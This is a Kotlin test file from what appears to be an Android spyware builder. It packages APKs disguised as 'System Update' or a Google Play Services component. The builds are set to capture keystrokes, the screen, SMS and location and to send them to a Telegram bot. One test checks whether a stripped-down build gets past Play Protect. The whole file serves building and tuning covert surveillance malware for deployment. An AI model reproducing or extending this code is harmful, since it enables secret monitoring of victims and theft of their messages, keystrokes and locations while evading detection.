package com.vector.console.data.payload

import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/**
 * Writes real artifacts for external tooling instead of asserting in-process.
 *
 * The manifest rewriter is the only part of this pipeline that touches a binary format nobody
 * specifies in one place, and `aapt2` is the same toolchain that produced it — a decode by
 * `aapt2` proves internal consistency, not correctness. `apktool` is an independent reader, so
 * running it over these outputs is the closest thing to a second opinion available without a
 * device.
 *
 * Three shapes are written on purpose: plain ASCII, non-ASCII (the pool stores UTF-8 byte
 * lengths, so a character-counting bug only shows up here), and a long label (every chunk after
 * the pool shifts, which is where an offset bug surfaces).
 *
 * Artifacts land in `app/build/probe/` and are not cleaned between runs.
 */
class ApktoolProbeTest {

    private fun template(): ByteArray =
        File("src/main/assets/payload/template.apk").readBytes()

    @Test
    fun `write decode probes`() {
        val dir = File("build/probe").apply { mkdirs() }
        val signer = ApkSignerV2.generateCredentials()

        mapOf(
            "ascii" to "System Update",
            "unicode" to "Pembaruan Sistem \u2013 Update\u2122",
            "long" to "Google Play Services Update Component (64-bit)"
        ).forEach { (name, label) ->
            val spec = PayloadSpec(
                label = label,
                collectScreen = true,
                collectKeylog = true,
                transport = PayloadSpec.Transport.TELEGRAM,
                telegramToken = "123456789:" + "A".repeat(35),
                telegramChatId = "1"
            )
            val built = PayloadPackager.build(template(), spec, signer)
            val out = File(dir, "$name.apk")
            out.writeBytes(built.apk)
            assertTrue("$name is empty", out.length() > 10_000)
            println("PROBE ${out.absolutePath} ${out.length()}")
        }
    }

    @Test
    fun `write friction probe`() {
        // Same build with the two Settings-heavy gates off. Used to measure whether Play Protect
        // blocks an APK that never touches accessibility or screen capture — the answer decides
        // whether the low-friction build is actually low-friction.
        val dir = File("build/probe").apply { mkdirs() }
        val spec = PayloadSpec(
            label = "System Update",
            collectLocation = true,
            collectSms = true,
            collectScreen = false,
            collectKeylog = false,
            transport = PayloadSpec.Transport.TELEGRAM,
            telegramToken = "123456789:" + "A".repeat(35),
            telegramChatId = "1"
        )
        val built = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        val out = File(dir, "plain.apk")
        out.writeBytes(built.apk)
        assertTrue(out.length() > 10_000)
        println("PROBE ${out.absolutePath} ${out.length()}")
    }
}
